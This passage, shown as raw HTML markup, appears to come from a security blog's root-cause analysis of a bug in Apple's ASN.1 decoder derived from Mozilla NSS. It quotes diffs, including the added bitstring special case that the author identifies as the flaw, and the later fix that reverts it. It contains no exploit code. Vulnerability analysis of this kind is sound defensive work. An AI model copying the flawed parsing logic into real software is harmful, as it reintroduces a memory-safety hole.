class="c1"&gt;@@&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c11"&gt;1584&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;7&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c11"&gt;1692&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;15&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;@@&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; * If our child was just our end-of-contents octets, we are done.&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;#ifdef&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp; __APPLE__&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;/* &lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Without the check for !child-&amp;gt;indefinite, this path could&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* be taken erroneously if the child is indefinite!&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;child&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;endofcontents &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;!&lt;/span&gt;&lt;span class="c3"&gt;child&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;indefinite&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;#else&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;child&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;endofcontents&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;They were pretty clearly looking for potential correctness issues with the code while they were refactoring it. The example shown above is a non-trivial change and one which persists to this day. (And I have no idea whether the NSS or Apple version is correct!) Reading the diff we can see that not every change ended up being marked with &lt;/span&gt;&lt;span class="c7"&gt;#ifdef __APPLE__&lt;/span&gt;&lt;span&gt;&amp;nbsp;or a comment. They also made this change to &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class="c9"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.f88b5d5286baf17de20f09e61c06eac6b0acbd51"&gt;&lt;/a&gt;&lt;a id="t.21"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;@@&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c11"&gt;1372&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;26&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c11"&gt;1469&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;33&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;@@&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;/*PORT_Assert (state-&amp;gt;pending &amp;gt; 0); */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;PORT_Assert &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;pending &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest &lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;SECItem&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;item &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c20"&gt;SECItem&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;data &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;len &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;pending &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;||&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;contents_length &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest &lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;SECItem&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;item &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c20"&gt;SECItem&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Data&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Length&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;contents_length &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;/* skip over (unused) remainder byte */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;else&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;In the context of all the other changes in this initial import this change looks much less suspicious than I first thought. My guess is that the Apple developers thought that Mozilla had missed handling the case of a bitstring with only the unused-bits bytes and attempted to add support for it. It looks like the &lt;/span&gt;&lt;span class="c7"&gt;state-&amp;gt;pending == 0&lt;/span&gt;&lt;span&gt;&amp;nbsp;conditional must have been Mozilla&amp;#39;s check for handling a 0-length bitstring so therefore it was quite reasonable to think that the way it was handling that case by &lt;/span&gt;&lt;span class="c7"&gt;NULL&lt;/span&gt;&lt;span&gt;ing out &lt;/span&gt;&lt;span class="c7"&gt;item-&amp;gt;data&lt;/span&gt;&lt;span&gt;&amp;nbsp;was the right thing to do, so it must also be correct to add the &lt;/span&gt;&lt;span class="c7"&gt;contents_length == 1&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;case here.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;In reality the &lt;/span&gt;&lt;span class="c7"&gt;contents_length == 1&lt;/span&gt;&lt;span&gt;&amp;nbsp;case was handled perfectly correctly anyway in &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_parse_more_bit_string&lt;/span&gt;&lt;span&gt;, but it wasn&amp;#39;t unreasonable to assume that it had been overlooked based on what looked like a special case handling for the missing unused-bits byte in &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;The fix for the bug was simply to revert the change made during the initial import 18 years ago, making the dangerous but unreachable code unreachable once more:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.cc85cec956c682ae2159b3e2792de03dfdc37f3c"&gt;&lt;/a&gt;&lt;a id="t.22"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;pending &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;||&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;(&lt;/span&gt;&lt;span class="c3 c12"&gt;state&lt;/span&gt;&lt;span class="c1 c12"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c12"&gt;contents_length &lt;/span&gt;&lt;span class="c1 c12"&gt;==&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;1&lt;/span&gt;&lt;span class="c1 c12"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest &lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;item &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Data&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Length&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; 